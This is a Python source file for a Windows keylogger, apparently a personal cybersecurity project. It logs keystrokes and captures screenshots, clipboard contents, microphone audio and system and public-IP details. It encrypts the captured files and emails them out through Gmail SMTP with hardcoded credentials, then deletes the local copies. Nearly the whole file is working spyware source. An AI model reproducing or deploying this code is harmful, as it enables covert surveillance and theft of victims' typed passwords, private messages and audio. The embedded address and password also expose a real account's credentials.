from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# File and path information
keys_information = "key_log.txt"
file_path = "D:\Cyber\projects\keylogger\Project"
extend = "\\"
file_merge = file_path + extend

# System information files
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

# Encrypted files
e_keys_information = "e_key_log.txt"
e_system_information = "e_systeminfo.txt"
e_clipboard_information = "e_clipboard.txt"

# Encryption key
encryption_key = "d82sX4d-y9G0bS7utB1-S3efbvQZO0JqWe6WT5KRnzs="

# Email information
email_address = "eladye666@deshr.edumschool.org"
password = "elad1234"
to_addr = email_address
username = getpass.getuser()

# Configuration variables
count = 0
keys = []

microphone_time = 10
time_iteration = 15
number_of_iterations = 0
number_of_iterations_end = 3
current_time = time.time()
stopping_time = time.time() + time_iteration


def send_email(file_name, attachment, to_addr):
    """
    Sends an email with an attachment.

    Args:
        file_name (str): Name of the attachment file.
        attachment (str): Path to the attachment file.
        to_addr (str): Email address of the recipient.

    Returns:
        None
    """
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = to_addr
    msg['Subject'] = "Log file"
    body = "Body_of_the_email"
    msg.attach(MIMEText(body, 'plain'))

    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % file_name)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(email_address, password)
    text = msg.as_string()

    s.sendmail(email_address, to_addr, text)
    s.quit()


def screenshot():
    """
    Takes a screenshot and saves it to a file.

    Returns:
        None
    """
    img = ImageGrab.grab()
    img.save(file_path + extend + screenshot_information)


def computer_information():
    """
    Retrieves and saves system information to a file.

    Returns:
        None
    """
    with open(file_path + extend + system_information, "w") as f:
        hostname = socket.gethostname()
        ip_addr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")

        except:
            f.write("Couldn't get public ip address")

        f.write(f"Processor: {platform.processor()}\n")
        f.write(f"System: {platform.system()}  {platform.version()}\n")
        f.write(f"Machine: {platform.machine()}\n")
        f.write(f"Hostname: {hostname}\n")
        f.write(f"Private IP Address: {ip_addr}\n")


def copy_clipboard():
    """
    Copies the contents of the clipboard and saves it to a file.

    Returns:
        None
    """
    with open(file_path + extend + clipboard_information, "w") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write(f"Clipboard Data: \n{pasted_data}")

        except:
            f.write("Clipboard could not be copied")


def microphone():
    """
    Records audio from the microphone and saves it to a file.

    Returns:
        None
    """
    fs = 44100
    seconds = microphone_time

    rec = sd.rec(seconds * fs, samplerate=fs, channels=2)
    sd.wait()
    write(file_path + extend + audio_information, fs, rec)


while number_of_iterations < number_of_iterations_end:

    def on_press(key):
        """
        Event handler for key press events.
        Records the pressed key, updates count and current_time variables,
        and writes the key to the log file if the count is reached.

        Args:
            key: The pressed key.
        """
        global keys, count, current_time

        print(key)
        keys.append(key)
        count += 1
        current_time = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        """
        Writes the captured keys to a log file.

        Args:
            keys: List of keys to be written to the file.
        """
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write("\n")
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        """
        Event handler for key release events.
        Stops the keylogger when the escape key is pressed or the stopping time is reached.

        Args:
            key: The released key.

        Returns:
            False: To stop the keylogger.
        """
        if key == Key.esc:
            # send_email(keys_information, file_path + extend + keys_information, to_addr)
            # screenshot()
            # computer_information()
            # microphone()
            # copy_clipboard()
            return False
        if current_time > stopping_time:
            return False

    # Start Listener
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    # Start actions --> screen shot, send mail, clipboard
    if current_time > stopping_time:
        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, to_addr)

        copy_clipboard()
        number_of_iterations += 1
        current_time = time.time()
        stopping_time = time.time() + time_iteration

# Encrypt and send captured files
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + e_system_information, file_merge + e_clipboard_information,
                        file_merge + e_keys_information]

for index, encrypt_file in enumerate(files_to_encrypt):
    with open(encrypted_file_names[index], 'rb') as f:
        data = f.read()

    fernet = Fernet(encryption_key)
    encrypted_data = fernet.encrypt(data)

    with open(encrypted_file_names[index], 'wb') as f:
        f.write(encrypted_data)

    send_email(encrypted_file_names[index], encrypted_file_names[index], to_addr)

time.sleep(120)

# Remove the files
delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge + file)